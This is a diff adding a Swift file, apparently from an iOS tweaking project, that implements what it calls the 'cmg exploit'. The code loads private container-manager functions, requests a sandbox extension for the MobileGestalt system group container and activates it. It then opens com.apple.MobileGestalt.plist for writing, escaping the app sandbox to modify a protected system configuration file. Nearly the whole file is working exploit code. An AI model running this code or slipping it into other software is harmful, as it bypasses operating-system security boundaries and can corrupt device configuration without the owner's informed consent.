@@ -1,0 +1,110 @@
+//
+//  CmgExploit.swift
+//  GestaltTweak
+//
+//  The cmg exploit method: uses libsystem_containermanager's
+//  container_query API (class 13, MobileGestalt SystemGroup) and activates
+//  the resulting sandbox extension, then opens
+//  com.apple.MobileGestalt.plist for writing.
+//  Licensed under the MIT License.
+//
+
+import Foundation
+import XPC
+import Darwin
+
+private typealias CmgCreateFn = @convention(c) () -> UnsafeMutableRawPointer?
+private typealias CmgActivateFn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
+private typealias CmgFreeFn = @convention(c) (UnsafeMutableRawPointer?) -> Void
+
+private typealias CmgSetUI64Fn = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
+private func cmgSetUI64Noop(_ query: UnsafeMutableRawPointer?, _ value: UInt64) {}
+private typealias CmgSetBoolFn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
+private typealias CmgSetObjFn = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
+
+private typealias CmgGetResultFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
+private typealias CmgGetTokenFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
+private typealias CmgGetPathFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?
+
+private func cmgLoadSymbol<T>(_ handle: UnsafeMutableRawPointer,
+                              _ name: String,
+                              fallback: T? = nil,
+                              as type: T.Type) -> T {
+    if let symbol = dlsym(handle, name) {
+        return unsafeBitCast(symbol, to: T.self)
+    }
+
+    if let fallback {
+        return fallback
+    }
+
+    fatalError("(cmg) required symbol missing: '\(name)'")
+}
+
+@objc(CmgExploit)
+final class CmgExploit: NSObject {
+    /// The open write file descriptor, kept alive for the process lifetime so
+    /// the activated sandbox extension stays granted.
+    private static var openFd: Int32 = -1
+
+    /// Runs the cmg exploit and returns an open file descriptor for
+    /// com.apple.MobileGestalt.plist, or -1 on failure.
+    @objc static func run() -> Int32 {
+        guard let library = dlopen(
+            "/usr/lib/system/libsystem_containermanager.dylib",
+            RTLD_NOW
+        ) else { return -1 }
+
+        let create = cmgLoadSymbol(library, "container_query_create", as: CmgCreateFn.self)
+        let activate = cmgLoadSymbol(library, "container_object_sandbox_extension_activate", as: CmgActivateFn.self)
+        let free = cmgLoadSymbol(library, "container_query_free", as: CmgFreeFn.self)
+
+        let setClass = cmgLoadSymbol(library, "container_query_set_class", as: CmgSetUI64Fn.self)
+        let setTransient = cmgLoadSymbol(library, "container_query_set_transient", as: CmgSetBoolFn.self)
+        let setGroupIDs = cmgLoadSymbol(library, "container_query_set_group_identifiers", as: CmgSetObjFn.self)
+        let setPlatform = cmgLoadSymbol(library, "container_query_operation_set_platform", as: CmgSetUI64Fn.self)
+        let setFlags = cmgLoadSymbol(library, "container_query_operation_set_flags", as: CmgSetUI64Fn.self)
+        let setPart = cmgLoadSymbol(library, "container_query_operation_set_part", fallback: cmgSetUI64Noop, as: CmgSetUI64Fn.self)
+
+        let getResult = cmgLoadSymbol(library, "container_query_get_single_result", as: CmgGetResultFn.self)
+        let getToken = cmgLoadSymbol(library, "container_object_get_sandbox_token", as: CmgGetTokenFn.self)
+        let getPath = cmgLoadSymbol(library, "container_object_get_path", as: CmgGetPathFn.self)
+
+        guard let query = create() else { return -1 }
+        setClass(query, 13)
+        setTransient(query, false)
+
+        let array = xpc_array_create(nil, 0)
+        xpc_array_set_string(array, XPC_ARRAY_APPEND, "systemgroup.com.apple.mobilegestaltcache")
+        setGroupIDs(query, array)
+
+        setPlatform(query, 2)
+        setFlags(query, (1 << 32) | (1 << 39))
+        setPart(query, 3)
+
+        guard let result = getResult(query) else {
+            free(query)
+            return -1
+        }
+        let token = getToken(result)
+        guard token != nil, activate(result, true) else {
+            free(query)
+            return -1
+        }
+
+        guard let cPath = getPath(result) else {
+            free(query)
+            return -1
+        }
+        let path = String(cString: cPath)
+
+        free(query)
+
+        let file = path + "/com.apple.MobileGestalt.plist"
+        openFd = file.withCString { cString in
+            Darwin.open(cString, O_WRONLY | O_CLOEXEC | O_NOFOLLOW)
+        }
+
+        return openFd
+    }
+}
